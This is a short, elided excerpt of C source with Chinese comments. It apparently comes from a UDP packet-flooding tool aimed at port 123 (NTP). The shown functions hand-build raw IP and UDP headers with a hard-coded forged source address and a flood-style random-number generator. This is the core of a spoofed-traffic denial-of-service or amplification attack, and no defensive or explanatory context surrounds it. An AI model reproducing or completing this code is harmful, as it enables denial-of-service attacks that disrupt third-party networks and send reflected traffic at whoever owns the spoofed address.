...
#define PHI 0x9e3779b9 // 常数值

static unsigned int payloadsize = 8; // 负载大小
static unsigned int xport = 123; // 目标端口
static uint32_t Q[4096], c = 362436; // 随机数生成数组和常量
...
void setup_ip_header(struct iphdr *iph) {
    ...
    iph->check = 0;
    iph->saddr = inet_addr("220.158.234.54"); // 源地址
}

// 设置UDP头部
void setup_udp_header(struct udphdr *udph) {
    udph->source = htons(5678); // 源端口
    udph->dest = htons(xport); // 目的端口
    udph->check = 0;
